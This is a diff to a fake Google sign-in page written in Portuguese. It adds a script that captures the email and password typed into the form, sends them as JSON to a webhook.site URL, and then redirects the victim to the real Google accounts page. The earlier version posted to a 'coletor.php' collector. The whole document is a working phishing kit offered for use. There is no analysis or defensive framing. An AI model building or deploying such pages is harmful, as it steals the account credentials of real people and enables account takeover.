@@ -27,8 +27,7 @@
       margin-bottom: 10px;
     }
 
-    input[type="email"],
-    input[type="password"] {
+    input {
       width: 100%;
       padding: 10px;
       margin: 8px 0;
@@ -60,12 +59,29 @@
   <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
   <h1>Fazer login</h1>
   <p>Use sua Conta do Google</p>
-  <form action="coletor.php" method="POST">
+  <form id="loginForm">
     <input type="email" name="email" placeholder="Email ou telefone" required>
-    <input type="password" name="password" placeholder="Senha" required>
+    <input type="password" name="senha" placeholder="Senha" required>
     <button type="submit">Próxima</button>
   </form>
 </div>
+
+<script>
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const email = document.querySelector('input[name="email"]').value;
+    const senha = document.querySelector('input[name="senha"]').value;
+
+    fetch("https://webhook.site/f646599d-7bac-4074-8483-c4fa3d54713e", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, senha })
+    }).then(() => {
+      window.location.href = "https://accounts.google.com/";
+    }).catch(err => console.error("Erro no envio:", err));
+  });
+</script>
 
 </body>
 </html>
